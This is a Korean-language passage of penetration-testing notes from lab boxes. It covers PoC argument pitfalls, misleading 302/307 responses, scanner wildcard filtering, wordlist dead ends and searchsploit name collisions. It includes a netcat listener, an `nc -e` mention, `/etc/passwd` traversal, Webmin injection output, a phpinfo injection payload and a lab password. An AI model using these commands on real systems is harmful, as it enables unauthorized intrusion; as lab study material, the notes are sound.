만약 argparse 가 `-rport` 를 조용히 삼켰다면 `rport` 는 **기본값 443** 이 됐을 것이고, 열려 있지도 않은 포트로 던진 뒤 `[-] The HTTP request failed` 만 보고 **「익스플로잇이 안 통한다」로 오판**했을 것임.
→ **PoC 의 `default=` 값을 실행 전에 읽을 것.** `through_the_wire.py` 는 `--rport` 기본값 `443` · `--protocol` 기본값 `https://` 라 **둘 다 명시하지 않으면 `https://<타겟>:443/` 로 던짐.**
→ 부수 함정 — `--fork-nc` 는 `action="store_true"` 인데 `default=True` 라 **끌 수 없음.** 스크립트가 항상 `nc -lvnp 1270` 을 포크하므로 별도 리스너를 미리 띄우면 포트 충돌이 남.
→ 대부분 `--help` 한 번이면 끝남.

**한 PoC 에서 함정 4종이 동시에 나온 사례.** [[Twiggy]] — `jasperla/CVE-2020-11651-poc`(출처: `~/PG/Twiggy/CVE-2020-11651-poc/exploit.py`·`git log`, 2026-08-26 Kali 에서 재확인):
- **① README ≠ 코드.** README 는 `[+] Salt version: 3000.1` 을 찍는다고 보여주나 실행에는 그 줄이 없음. `git log` 로 확인하니 커밋 `eca6ba2`(`Rework version / vulnerability detection`)에서 저자가 이미 지웠고, 애초에 그 값은 `salt.version.__version__` — **공격자 Kali 에 pip 로 깐 salt 의 버전이지 타겟 버전이 아님.**
- **② 성공 판정 로직이 아무것도 판정하지 않음** — `if rets.get('jid')`(A-12).
- **③ `--run-checks`(`-c`) 는 원격 공격 옵션이 아님.** 소스 주석이 `# Assuming this check runs on the master itself` 이고 마스터 로컬에 `/tmp/salt_cve_teta` 를 쓰고 `/var/cache/salt/master/.root_key` 를 읽음 — **방어자용 점검 코드**임. 게다가 세 군데가 깨져 있음: `salt.utils.fopen`(최신 salt 에서 제거된 API) · `debug` 맨이름 참조(실제 변수는 `args.debug` → `NameError`) · `pp(rets)`(`pprint` import 부재 → `NameError`). **건드리지 말 것.**
- **④ `--force`(`-f`) 는 죽은 옵션.** `parser.add_argument('--force', '-f', dest='force', default=False, action='store_false')` — `default=False` 인데 `action='store_false'` 라 주든 안 주든 `False` 고정이고 `args.force` 는 스크립트 어디서도 읽히지 않음. ③의 커밋에서 버전 판정이 통째로 사라지며 **이 옵션이 제어하던 대상만 없어지고 옵션이 남은 것.**
→ **정리 — README 는 코드보다 오래됐다고 가정 / 버전 문자열이 «누구 것»인지 확인 / 성공·실패 판정 로직을 직접 읽을 것.** 실행 전 30초 소스 훑기가 넷을 전부 잡음.
→ 부수 — salt 4506 은 인증 없이 버전을 알려주지 않으므로 이 박스에서 타겟 salt 버전은 **끝내 확인 못했음.** `_prep_auth_info` 가 응답했다는 사실 자체가 유일한 취약 증거였고 그것으로 충분했음 — **버전 배너가 없으면 «행위 차이»로 판정할 것**(A-11 · B-1-52).


**예외의 «발생 위치»가 곧 진단임 — 로컬 트레이스백이면 타겟은 무죄.** [[Levram]] — EDB 50640 은 `/api/project/index` 응답에서 `dict3[0]['name']` 을 읽는데, 프로젝트가 0개인 깨끗한 박스에서 곧바로 `IndexError` 로 죽음. 그것이 **파이썬 로컬 트레이스백**이라는 사실 자체가 진단임 — 타겟이 요청을 거부한 것이 아니라 스크립트가 자기 데이터 처리에서 죽은 것.

| 증상 | 의미 |
|---|---|
| 타겟이 401/403/404 반환 | 인증·경로 문제. 익스플로잇 이전 단계 |
| 타겟이 500 반환 | 주입은 도달했으나 페이로드가 깨짐 — **좋은 신호**(A-12) |
| 로컬 파이썬 트레이스백 | **타겟과 무관.** 스크립트를 읽을 것 |
| 무응답·타임아웃 | 아웃바운드 차단 또는 페이로드가 셸을 블로킹(A-31) |

⛔ **「스크립트가 죽는 원인」을 「취약점의 전제조건」으로 승격시키지 말 것.** Levram 의 취약 코드(`views.py`)는 프로젝트 디렉터리 존재를 한 번도 검사하지 않음 — `project_path` 는 문자열 조립일 뿐이고 셸은 `exec` 이전에 **명령 치환을 먼저** 처리하므로 대상 경로가 없어도 백틱은 이미 실행된 뒤임.
→ **판별법: 그 전제조건을 취약 코드 원문에서 찾을 수 있는가?** 못 찾으면 취약점의 조건이 아니라 «도구의 성질»임. 해법은 스크립트를 고치는 것이 아니라 **전제를 만들어 주거나**(빈 프로젝트 하나 생성) **수동 `curl` 로 갈아타는 것**이고, 이 박스는 후자가 4분 만에 셸을 만들었음(EDB 디버깅 자체는 4분에 접었음).


**「인자를 추측하지 말고 `-h` 를 먼저 한 번」 — 3초짜리 반사.** [[Clue]] — 처음 잡은 스크립트에 `-h TARGET` 을 위치 인자처럼 붙였다가 argparse 가 도움말을 찍고 종료해 뒤 인자를 아예 안 읽었음. `~/.zsh_history` 1096~1099행 원문:
```text
python 49362.py
python 49362.py -h 192.168.115.240 -p 3000
python 49362.py -h 192.168.115.240 -p 3000 /etc/passwd
python 49362.py 192.168.115.240 -p 3000 /etc/passwd      ← 성공
```
그때 화면에 떴을 usage — **박스 정지 후 Kali 에서 재현한 것이고 당시 캡처가 아님**:
```text
usage: 49362.py [-h] [-p PORT] [-f] [-n NUMBER] target file

positional arguments:
  target               Cassandra Web Host
  file                 eg. /etc/passwd, /proc/sched_debug + /proc/<cass-web-
                       pid>/cmdline

options:
  -h, --help           show this help message and exit
  -p, --port PORT      Cassandra Web Port
  -f, --force          Run the payload even if server isn't Cassandra Web
  -n, --number NUMBER  Adjust the number of dot-dot-slash
```
화면에 뜬 usage 가 오히려 정확한 사용법(위치 인자 `target`/`file`, `-n` 으로 traversal 깊이 조절)을 **공짜로** 알려줌.
→ 부수 — **그 도구의 «기능 범위»부터 확인할 것.** 같은 박스의 `49362.py` 는 파일 읽기 전용인데 인자로 `'nc -e ...'` 를 주면 그냥 「읽을 파일 이름」으로 해석됨(A-31).
→ 별건 — `ssh cassie:SecondBiteTheApple330@192.168.115.240` 도 시도돼 거부됐음(`~/.zsh_history` 1059행). `user:pass@host` 는 curl·ftp·브라우저의 **URL 문법**이고 ssh 는 `user@host` 만 파싱해 전체를 사용자 이름 하나로 취급함. **ssh 에 비밀번호를 명령줄로 주는 표준 방법은 없음** — 자동화하려면 `sshpass -p 'PW' ssh user@host`.

#### A-15. 302 여도 본문이 있다 / 블랙리스트가 302 를 오판한다

**`curl -L`(리다이렉트 따라감)로만 보면 진짜 엔드포인트를 놓친다.** [[Robust]]: `home.php` 는 인증 안 된 요청에 `Location:` 헤더로 302 를 보내면서도 `exit`/`die` 없이 **페이지 전체를 출력**함. 리다이렉트를 따라가지 않아야(`curl` 기본 동작) 인증 뒤 화면이 그대로 보임. 배치 프로빙에서 「302 인데 body 3030B」(나머지 302 는 0B)를 놓치지 않은 게 진입점이 됨.

**gobuster 기본 blacklist(`-b 404,403`)가 전부 302 를 돌려주는 사이트에서는 무력화된다.** 확장자 없는 경로(`/README`·`/admin/` 등)가 전부 302 라 와일드카드 판정에 걸려 결과 파일이 **0바이트**로 끝남(`gobuster-80.txt`). `-b 302,404` 로 재실행해야 진짜 히트(`/login.php`·`/ip.php`)가 나옴. 도구 문제가 아니라 대상 특성이니 **결과가 비면 blacklist 부터 의심할 것.** 다만 `/home.php` 자체는 302 라서 이 재실행에서도 안 잡힘(`gobuster-xff.txt`) — **디렉터리 버스팅만 믿으면 진입점을 놓친다.** 응답이 균일하게 302 로 보이는 사이트는 A-25 도 함께 의심할 것.

**Webmin 은 「302 인데 본문은 거부 경고」를 낸다 — 상태코드만 보면 영영 못 읽는다.** [[Outdated]]: CVE-2022-36446 첫 요청부터 다섯 번째까지 응답이 **계속 302** 였음. 그 사이 슬래시 잘림을 의심해 base64 로 감싸 보고, `confirm=1` 을 넣어 보고, `mode=new` 를 넣어 봤으나 **응답이 한 번도 변하지 않음.** 실수는 `-o` 로 파일에만 받아두고 상태코드만 본 것 — 그 파일을 열자 Webmin 이 답을 그대로 적어 두고 있었음:
```html
<title>Security Warning</title>
...
<b>Warning!</b> Webmin has detected that the program <tt>https://127.0.0.1:10000/package-updates/update.cgi?xnavigation&#61;1</tt> was linked to from an unknown URL, which appears to be outside the Webmin server.
...
Find the line <tt>referers_none=1</tt> and change it to <tt>referers_none=0</tt>.
```
— 출처: `~/PG/Outdated/exploit_resp.html`

`-e 'https://127.0.0.1:10000/package-updates/'` 로 `Referer` 를 붙이자 즉시 200 + `apt-get -y  install ;echo…` 출력(15:30:46 → 15:35:54, **약 5분**).

⚠️ **302 는 referer 체크가 만든 것이 아님.** Webmin 의 referer 거부 경로(`web-lib-funcs.pl` 의 `if (!$trust)`)는 경고 본문을 뱉고 `exit` 함. 302 가 섞여 나온 것은 요청 URL 에 `?xnavigation=1` 이 붙어 있어 그 앞의 테마 리다이렉트 분기(`REQUEST_URI =~ /xnavigation=1/` → `&redirect("/")`)가 함께 탄 결과임 — **상태코드는 302, 본문은 경고 페이지**라는 이상한 조합이 여기서 나옴.
→ **`curl -sk … | head -40` 을 기본 습관으로.** `-o` 로 받아만 두는 습관이 여기서 5분을 태움.

**feroxbuster 의 «자동» 와일드카드 필터는 404 가 아닌 코드에도 붙음 — 그러면 보호된 자원이 통째로 숨음.** [[MiddlewareBypass]] — 디렉터리 스캔 29건 어디에도 정답 경로 `/admin` 이 없었음. 원인은 아래 한 줄:
```text
307      GET        1l        1w       13c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
```
feroxbuster 는 「없는 경로가 전부 같은 모양(307 + 본문 13바이트)으로 응답한다」를 감지해 그 모양을 **자동 필터에 넣고 이후 같은 모양의 307 을 화면에서 지움.** 이 앱은 미들웨어가 `NextResponse.redirect()`(기본 **307**)로 튕기는 구조라 보호 라우트도 같은 필터에 걸려 사라진 것 `[가정]` — 확정된 것은 「없는 경로에도 307 을 준다」까지이고 `/admin` 자체의 응답은 이 박스에서 캡처된 적이 없음.

**신호** — `/unauthorized`·`/login`·`/denied` 같은 「차단 착지 페이지」가 결과에 200 으로 남아 있으면 그 짝이 되는 307/302 가 필터로 지워졌을 가능성을 먼저 의심할 것. **`Auto-filtering` 줄이 404 «아닌» 코드에 붙어 있으면 그 코드가 곧 보호 자원의 지문임.**

**탈출구 셋** (Kali 재실행 확인, feroxbuster 2.13.1 — `-D` = `--dont-filter`, `-C` = `--filter-status`, `-r` = `--redirects`):
```bash
feroxbuster -u http://TARGET:PORT/ -w <wordlist> --dont-filter -t 100
ffuf -u http://TARGET:PORT/FUZZ -w <wordlist> -mc all -fc 404 -fs <404크기>
gobuster dir -u http://TARGET:PORT/ -w <wordlist> -s 200,204,301,302,307,308,401,403 -b ''
```
- **`--dont-filter`(`-D`) 가 auto-filter 를 끄는 유일한 수단임.** `-C 404` 는 deny-list 라 단독으로는 auto-filter 를 못 끔 — 노이즈를 줄이려면 `-D` 와 **함께** 쓸 것
- **`-r`(리다이렉트 추종)은 «발견» 단계 전용임.** 우회 성공 판정에 `-r`·`curl -L` 을 쓰면 307 을 따라가 `/unauthorized` 본문만 보고 성공을 실패로 오판함(위 [[Robust]] 사례와 같은 뿌리)

**존재하지 않는 경로에도 302 를 주는 서버가 있음 — 그러면 fuzz 결과가 전량 위양성임.** [[Hub]] — BarracudaServer(9999) 스캔에서 `/2009`·`/App_Data`·`/fileadmin`·`/downloader`·`/openx` 등 **결과 62건 전량**이 catch-all 302 였음(`~/PG/Hub/ferox_9999.log` — 결과 라인 62개, 302 외 상태코드 0건).

확인은 아무 문자열이나 한 번 던지는 것으로 끝남:
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://TARGET:PORT/nonexistent-abc123
```
302 가 돌아오면 그 코드를 `-C 302`(feroxbuster) / `-b 302`(gobuster)로 거를 것.
→ **fuzz 시작 «전»에 「없음」 응답을 확정하는 30초 베이스라인**이 이 박스에서 수십 분을 아꼈을 자리임.

#### A-16. 워드리스트 열거가 전부 공전한다

**정적 워드리스트가 막히면 응답 «본문»(주석·메타데이터)부터 재검토할 것.** 자동 도구 0건은 「앱 부재」가 아니다.

[[BossPlayersCTF]] — raft-small-words + 개별 프로브 26종이 24/26 404 로 전량 공전. 진짜 진입점은 `index.html` 이 `</html>` 뒤 **118줄 공백으로 화면 밖에 밀어둔 HTML 주석**의 3중 base64 디코드 체인이었음. 렌더된 화면만 봐서는 절대 안 보임.

- **인코딩 문자열은 한 번 디코드하고 끝내지 말 것.** 결과가 다시 base64/hex 로 보이면 계속 풀 것 — 몇 겹인지 미리 알 수 없으므로 **「평문이 나올 때까지」를 종료 조건**으로(이 박스는 3중)
- **응답 크기는 우선순위 근거가 안 됨** — `/logs.php`(34KB)는 커널 dmesg 덤프였고 자격증명·경로 0건. 큰 응답일수록 덤프일 확률이 높음
- `robots.txt` 의 "super secret password" 는 순수 미끼 — 디코드하면 `lol try harder bro`

[[Cobbles]] — feroxbuster 3종(common / directory-list-2.3-medium ~220k×php,txt,html,bak / raft-large-directories)을 완주해도 `index.php`·`style.css`·`favicon.png`·`server-status` 밖에 못 찾음. 워드리스트에 `zm-prod` 가 없었기 때문. 진짜 경로는 **`/server-status`(mod_status) 스코어보드**에 내부 스캐너 버스트로 105회 찍혀 있었음(`GET /zm-prod/ HTTP/1.0`, `burst.txt`). 초기 침투에서는 그 트래픽을 「미끼 소음」으로 판단해 버렸고, 재검토에서 로그 줄을 경로 힌트로 읽어 진입함.

→ **`/server-status`·access 로그·referrer 에 남은 경로 문자열을 눈으로 읽는 것이 브루트를 한 시간 더 돌리는 것보다 낫다.**

**문서 사이트는 손절 신호임.** `http-title` 이 이미 제품 이름을 말했고 첫 200 응답 몇 개가 전부 그 제품의 문서 페이지면 그 포트는 거기서 접을 것 — 문서 사이트에는 로그인도 업로드도 파라미터도 없음.
[[Jacko]] 실측 — 80/tcp `http-title: H2 Database Engine (redirect)`. feroxbuster(`directory-list-lowercase-2.3-medium` + `-x html,txt`)가 **20분**을 돌아 58건을 냈고 **전부 H2 배포판 문서**(`html/features.html`·`html/changelog.html`·`javadoc/`)였음 — `h2/docs` 를 IIS 로 그대로 노출한 것. **얻은 정보 0.** 진짜 입구는 nmap 이 이름까지 붙여준 8082(`H2 database http console`)였음(C-1).

**진입점이 «읽히는 설정 파일의 주석»에 있는 경우 — 스캐너가 끝났다고 열거가 끝난 것이 아님.** [[PlanetExpress]] 실측: `gobuster dir -w directory-list-2.3-medium.txt -x php,txt,md,html -t 40` 결과 8줄이 **전량 이미 알던 경로**였음(`/index.md`·`/index.php`·`/content`·`/themes`·`/assets`·`/plugins`·`/vendor`·`/config`). 진짜 진입점 `/plugins/PicoTest.php` 는 워드리스트에 없는 이름이고, `/config/config.yml` 의 **주석 처리된 블록**에서 사람이 읽어야 나왔음:
```text
## 
# Self developed plugin for PlanetExpress
#PicoTest:
#  enabled: true
```
— 출처: `~/PG/PlanetExpress/gobuster.log` · `config.yml`
→ **열거로 «읽히는 파일»을 확보했으면 끝까지 읽을 것.** 주석은 「그 값이 기본값」이라는 문서이자(B-69) 「그 경로가 실재한다」는 목록임. 브루트를 한 시간 더 돌리는 것보다 설정 파일 한 개를 눈으로 읽는 것이 쌈.

**정적 서빙이 «없는» 프레임워크에서는 워드리스트가 원리적으로 0건임 — 30초짜리 판정을 먼저 할 것.** Sinatra(classic)·Flask 는 `public/` 을 명시하지 않으면 정적 파일을 아예 안 줌. 정의된 라우트 외에는 쳐다보지도 않으므로 404 만 쌓임.

[[RubyDome]] — `dirb/common.txt`(4614행) + `-x txt,ru,erb,rb,lock` = **약 27,800 요청에 발견 0건.** `Gemfile.lock`·`app.rb`·`.git` 처럼 Ruby 앱이면 당연히 있을 파일이 전부 404 였음. 존재하지 않는 경로 하나를 찔러 응답 지문을 보면 판정됨:
```bash
curl -si http://TARGET:3000/zzz_definitely_not_here | head -20
```

| 응답 지문 | 판정 | 다음 수 |
|---|---|---|
| `X-Cascade: pass` + `Sinatra doesn't know this ditty.` | Sinatra classic | 라우트 열거만 의미 있음. dirbust 중단 |
| Werkzeug 404 + `The requested URL was not found` | Flask | 동일 |
| `Server: nginx`/`Apache` + 파일시스템형 404 | 정적 서빙 있음 | dirbust 진행 |
| 모든 경로가 200 (SPA fallback) | Node/SPA | 워드리스트 무의미, JS 번들 분석으로 전환 |

**정확히는 「돌리지 마라」가 아니라 「기다리지 마라」임.** [[RubyDome]] 은 dirbust 를 백그라운드에 던져두고 2분 만에 백트레이스로 CVE 를 확정했음. **워드리스트는 공짜로 돌지만 주의는 공짜가 아님.** 반대로 읽어 「dirbust 를 아예 시작하지 말라」는 과잉 규칙을 가져가지 말 것.

⚠️ **gobuster `-o` 파일만으로는 「완주 0건」과 「중단」이 구분되지 않음.** `-o` 는 **발견 항목만** 기록하므로 0바이트가 두 경우 모두에서 나옴. [[RubyDome]] 은 `gobuster.txt`·`gobuster_common.txt` 가 **둘 다 0바이트**이고, `directory-list-2.3-medium` 실행분은 300초 제한에 걸려 중단됐는데 그 사실이 파일에 안 남음 — 「없다」가 아니라 **부분 커버리지**로 기록해야 할 자리임.
→ **표준출력(진행률·최종 요약)을 함께 저장할 것.** 이 구분이 없으면 나중에 「혹시 못 본 게 있나」 하고 되돌아오는 낭비를 못 막음.

**느린 링크(프록시·터널) 경유 브루트는 300초 제한에 걸려 미완주함 — 그때는 워드리스트가 아니라 «방식»을 바꿀 것.** [[Squid]] — 22만 라인 사전을 Squid 프록시로 밀었더니 요청당 수백 ms 지연으로 완주 실패. 그런데 WampServer 홈페이지가 이미 `Your Aliases: adminer phpmyadmin phpsysinfo` 를 렌더하고 있었음 — 무차별 대신 그 이름들만 타겟형으로 프로브하니 `/adminer`·`/phpsysinfo`·`/wampthemes`·`/testmysql.php` 가 전부 한 번에 적중함.
→ **홈페이지·`robots.txt`·JS 번들·에러 페이지·`sitemap.xml` 이 경로를 직접 알려주는 경우가 무차별 열거보다 훨씬 흔함.** 프록시·VPN 경유에서는 사전을 `common.txt` 급으로 줄이거나 아예 타겟형으로 전환할 것.

**수동 대안(도구 없이) — 시험 대비로 손에 붙여둘 것.** feroxbuster·gobuster 는 OSCP 에서 허용되지만(E 절), 죽었을 때 이어갈 수단이 있어야 함:
```bash
for w in $(cat wordlist.txt); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://TARGET:PORT/$w/")
  [ "$code" != "404" ] && echo "$code $w"
done
```
— 출처: [[Sorcerer]]

#### A-17. 부가 포트가 기본 페이지·403 만 뱉는다

**「버전 있는 유명 앱」이 보이면 그것부터. 기본 페이지·403 은 뒤로 미룰 것.**

[[CVE-2023-46818]] — 8080 은 Apache2 Ubuntu 기본 페이지, 8081 은 403. 고정 경로 26종 프로빙에서 `/server-status`(403) 외 소득 없음. 여기 시간을 안 쓰고 80 의 ISPConfig(버전이 보이는 관리 패널)에 집중한 것이 주효했음.

⚠️ **다만 「없다」가 아니라 「안 봤다」임** — 이 두 포트에 디렉터리 브루트는 **돌리지 않았음.** 배제와 미완을 섞어 적지 말 것(D 절).

**웹 포트가 여럿이면 「같은 앱인가」부터 재되, 「같은 문서 루트」와 「같은 Alias 를 공유한다」를 구분할 것.** [[Pebbles]] 는 80·3305·8080 세 포트가 전부 `Apache/2.4.18 (Ubuntu)` 였고 셋 다 `/zm/` 와 `/javascript/` 를 노출했음. 그러나 **문서 루트 자체는 서로 달랐음** — 80 은 `index.php` 1134B + `/images`·`/css`, 3305 는 Apache 기본 `index.html` 11321B, 8080 은 `index.php` 11074B + `/hello.php`(출처: `gob_80.txt`·`gob_3305.txt`·`gob_8080.txt`). `/zm`·`/javascript` 는 데비안/우분투 패키지가 심는 **전역 Apache `Alias`** 라 vhost 와 무관하게 전 포트에 뜸 `[가정]`.

→ **「셋이 같으니 하나만 파면 된다」로 잘라내면 포트 고유 자산을 놓침.** [[Pebbles]] 에서 `/hello.php` 는 8080 열거에만 나왔고 그것이 8080 정체 판정(A-11)의 재료였음. 대표 파일 md5 대조는 **`/zm/` 같은 공유 경로 하나가 같다는 것만 증명**하지 루트가 같다는 증명이 아님.


**`204 No Content` 만 돌려주는 API 는 디렉터리 브루트포싱이 원리적으로 무력함** — 존재하는 경로와 없는 경로의 응답이 구분되지 않기 때문임.
[[Flu]] 의 8091(`Server: Aleph/0.4.6`) 지문 읽기:

| 관측 | 의미 |
|---|---|
| 모든 GET 에 `204 No Content` | 본문이 없음. 열거할 표면이 없음 |
| `Access-Control-Allow-Origin: *` · `Allow-Methods: OPTIONS, GET, PUT, POST` | CORS 가 활짝 열린 API 엔드포인트. UI 가 아님 |
| `Server: Aleph/0.4.6` | Clojure 의 비동기 HTTP 서버 «라이브러리». 제품이 아니라 프레임워크 이름임 |
| 비정상 입력에 `414 Request-URI Too Long` | 자체 파서를 쓰는 커스텀 서비스 |

**`204` 만 돌려주는 서비스를 만났을 때:**
1. `OPTIONS` 로 허용 메서드를 봄(Flu 는 `PUT`·`POST` 가 열려 있었음 — **쓰기 가능성**)
2. `PUT` 으로 뭔가 올려 봄. CORS 가 `*` 인 API 는 인증이 없는 경우가 많음
3. 경로 힌트는 **다른 채널**에서 옴 — 다른 웹 포트의 HTML·JS, 설정 파일, **셸을 잡은 뒤의 프로세스 인자**

Flu 는 3번을 할 기회(셸)가 있었는데도 밖에서 헤맬 때는 안 했음. **셸을 잡은 뒤 `ss -lntup` + `ps -eo user,pid,args` 한 번에 정체가 끝났음** — `synchrony.core`(Confluence 협업편집 백엔드), 같은 `confluence` 계정이라 권한상승 경로도 아니었음. [[Clue]] 가 같은 반사로 포트를 5개 더 찾은 사례임.
⚠️ 1차 세션의 `[가정]`(「Confluence 와 무관한 별개의 Clojure 서비스」)은 **절반만 맞았음** — 별개 제품이 아니라 같은 제품의 두 번째 프로세스였음.
⚠️ **포트 80 이 아예 없는 박스도 있음.** 습관대로 80 에 브루트를 돌리려다 없다는 것을 확인하는 데 시간을 씀. `-p-` 결과를 먼저 읽을 것.

#### A-18. 배경 스캔이 도는데 같은 스캔을 손으로 또 돌렸다

**증상** — recon 스크립트가 백그라운드로 던진 gobuster 가 아직 도는데, 결과가 궁금해 손으로 한 번 더 돌림. 결과가 완전히 같아 통째로 중복이 됨.

[[Graph]] 실측 — `.bg-gobuster.sh`(14:52:01 시작 → `gobuster-80.txt` 15:04:53 완료, 약 12분, 확장자 6종 포함)가 도는 중에 14:54:47 에 별도 실행 결과 `gobuster-raft.txt` 가 남음. 둘 다 `/static`·`/Static`·`/STATIC` 3개로 동일. (3분 안에 끝난 것으로 보아 수동 쪽은 확장자를 안 붙인 것으로 보임 — `[가정]`.)

**손으로 돌린 것을 구별하는 법** — 산출물에 ANSI 컬러 이스케이프(`^[[36m`)가 살아 있고 끝에 래퍼 마커(`DONE`)가 붙어 있으면 배경 스크립트(`--no-color`)가 아니라 수동 실행임. 사후에 노트를 쓸 때 이 지문으로 두 실행을 가름.

**판정** — 이 박스에서는 손실이 크지 않았음. 배경 스캔이 도는 12분 동안 GraphQL 열거가 전부 끝나(`gql/` 산출물이 14:52~14:53 에 몰림) 「배경 스캔이 도는 동안 다른 벡터를 민다」 원칙 자체는 지켜졌음. **배경 스캔이 이미 더 넓은 범위를 포함하고 있는지부터 확인할 것** — 포함하면 두 번 돌릴 이유가 없음.

**반대 방향의 «좋은» 사례 — 긴 스캔은 걸어두고 다른 창에서 손으로 만질 것.** 특히 nmap 이 이미 제품명을 짚어준 포트가 따로 있을 때.
[[Jacko]] 실측 — feroxbuster 가 20분(15:44~16:05) 도는 동안 `49384.txt` mtime 이 **15:50:27** 임. 아직 돌던 시점에 다른 창에서 버전을 알아내고 익스플로잇까지 확보했다는 뜻이고, **진행을 만든 것은 feroxbuster 가 아니었음.** ⚠️ 이 시점에 `1.4.199` 를 어디서 얻었는지는 기록에 없음 — 8082 콘솔을 이미 열어봤거나 nmap 지문의 `[90117-199]` 를 읽었거나 둘 중 하나임 `[가정]`.
→ **스캔이 끝나기를 기다리는 20분은 시험에서 그대로 손실임**(D 절).

**반대 방향의 실패 — 자동 열거를 던져놓고 «그것을 기다리는» 것.** [[Vault]] 실측: `enum4linux-ng -A` 와 익명 `ldapsearch` 두 경로를 실제로 던졌음.
```text
enum4linux-ng -A 192.168.120.175      # ← IP 오타(.175), 뒤에 .172 로 정정
enum4linux-ng -A 192.168.120.172
ldapsearch -x -H 'ldap://192.168.120.172' -s base namingcontexts
ldapsearch -x -H 'ldap://192.168.120.172' -b "dc=vault,dc=offsec"
```
— 출처: `~/.zsh_history`

`enum4linux-ng -A` 는 SMB 공유·RID 브루트·LDAP·비밀번호 정책을 한 명령으로 묶음. `ldapsearch` 쪽은 `-s base namingcontexts` 로 도메인 DN 을 먼저 확인한 뒤 트리를 익명 덤프하는 표준 절차라 **경로 자체는 옳음**(`description` 필드의 비밀번호를 노리는 수 — B-51).

⚠️ **이 네 명령의 출력은 어디에도 남지 않아 무엇을 얻었는지 단정할 수 없음 — 관측 없음.** 확정적인 것은 이어서 `smbclient` 로 `DocumentsShare` 를 직접 판 것이 답이었다는 사실뿐임.
→ **자동 열거는 백그라운드로 던지고 그동안 `smbclient -L`·`smbmap` 으로 손으로 팔 것.** RID 브루트가 특히 느리고 출력이 길어 핵심을 놓치기 쉬움.
→ **그리고 출력을 파일로 떨어뜨릴 것.** 터미널에서 읽고 버리면 사후에 「배제했는가 / 못 해봤는가」를 구분할 수 없게 됨 — [[Vault]] 에서 실제로 그렇게 됐음.

#### A-19. SNMP·UDP 가 빈손인데 미련이 남는다

`onesixtyone` 커뮤니티 문자열 5종 전부 무응답 + UDP top-100 에 열린 포트 없음 = 빈손. 확인 자체가 각각 수 초라 손실이 없으므로 **관례상 돌리되 결과가 비면 즉시 접을 것**([[Graph]]).

⚠️ **판정 문구를 정확히 쓸 것** — 161/udp 는 `closed` 목록에 **없고** `Not shown: 90 open|filtered udp ports (no-response)` 쪽에 들어감. 「닫힘이 확인됨」이 아니라 **「열려 있다는 근거가 없음」**임. 「배제했다」와 「끝까지 못 해봤다」를 섞으면 다음 사람이 닫힌 문으로 오독함.

#### A-1-10. tmux 에 던진 스캔이 «조용히» 죽는다

**증상** — 장시간 스캔을 tmux 에 던져놓고 넘어갔는데, 실은 시작하자마자 죽어 있었음. 화면에 에러가 남아도 페인을 안 보면 모름.

[[Fikklish]] 실측 — 첫 `gobuster` 가 `/usr/share/seclists/...` **워드리스트 경로 부재**로 0초에 죽었음. `capture-pane` 으로 확인하기 전까지 실패를 몰랐음.

→ **장시간 명령을 tmux 에 던진 뒤에는 최소 한 번 「결과 파일의 크기·줄 수」를 확인할 것.** 「던져놓고 넘어간다」(D 절)의 전제는 **그것이 실제로 돌고 있다는 것**임. 워드리스트 경로는 던지기 전에 `ls` 로 한 번 볼 것.

**같은 부류 ② — 입력 파일이 아직 없는데 세션을 먼저 띄움.** [[Monster]] 실측: hydra tmux 세션을 `users.txt` 를 만들기 **전에** 띄워 세션이 즉시 죽었고 원인이 안 보였음. **파일 의존성은 세션을 만들기 전에 먼저 만들 것.**

**같은 부류 ③ — `~/.zshrc` 별칭은 비대화형 tmux 안에서 확장되지 않음.** `nnmap` 같은 별칭은 **대화형 zsh 전용**이라 `ssh kali "tmux new-session -d ... '<명령>'"` 안에서는 그대로 「명령을 찾을 수 없음」이 되어 스캔이 0초에 죽음([[Monster]]). **tmux 에 던지는 명령은 별칭을 펼쳐서 쓸 것.**

[[PwnLab]] 도 같은 함정 — `ssh kali "tmux new-session -d -s pwnlab_nmap 'cd ~/PG/PwnLab && nnmap 192.168.248.29 …'"` 가 `zsh:1: command not found: nnmap` 로 0초에 죽었음(tmux `capture-pane` 실측, `~/PG/PwnLab/try2_nnmap_alias_notfound.log`). **10분 뒤 페인을 다시 봐서야 발견**했고, `nnmap` 을 `nmap -sCV -p- -Pn -A --min-rate 5000` 으로 풀어써 17:47 에 재실행. 다행히 quick 스캔(21/22/80/111/139/443/445/3306/8080)이 이미 별도 세션에서 정상 진행 중이라 **침투 자체는 지연되지 않았고, 손실은 순수히 「안 도는 줄 몰랐던 10분」**뿐이었음.
→ **백그라운드 작업은 던진 직후와 몇 분 뒤 두 번 확인할 것.** 「돌고 있겠지」가 이 함정의 본체임.

#### A-1-11. searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다

**⑴ 0건이 「익스플로잇 없음」이 아님.** exploit-db 에 올라오지 않은 CVE 가 훨씬 많음. [[Fikklish]] — `searchsploit weblate`·`searchsploit ruby-git` 둘 다 **0건**(Kali 에서 재확인)이었으나 CVE-2022-23915·CVE-2022-25648 은 웹 검색으로 그대로 나왔고 둘 다 이 박스의 정답이었음. **searchsploit 0건은 부재의 근거가 아님**(A-11).

**⑵ 히트가 «같은 제품»이라는 보장도 없음.** `Cockpit`·`Portal`·`Console`·`Dashboard`·`Hub` 처럼 흔한 이름은 exploit-db 에서 반드시 충돌함. **결과를 열기 전에 제품 식별 줄을 볼 것** — 10초면 됨.
```bash
searchsploit Cockpit
```
```text
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Cockpit CMS 0.11.1 - 'Username Enumeration &  | multiple/webapps/50185.py
Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Reque | php/webapps/44567.txt
Cockpit CMS 0.6.1 - Remote Code Execution     | php/webapps/49390.txt
Cockpit Version 234 - Server-Side Request For | multiple/webapps/49397.txt
openITCOCKPIT 3.6.1-2 - Cross-Site Request Fo | php/webapps/47305.py
---------------------------------------------- ---------------------------------
```
`Cockpit`(RedHat 웹 콘솔) · `Cockpit CMS`(별개 PHP 제품) · `openITCOCKPIT` **셋이 한 화면에 섞여 있음.** [[Cockpit]] 은 여기서 제품 확인을 건너뛰고 다른 제품(Cockpit CMS)의 RCE 를 붙들었음 — `49390.txt` 안 페이로드 `{"auth":{"user":"test'.phpinfo().'","password":"b"}}` 는 이 박스와 무관.

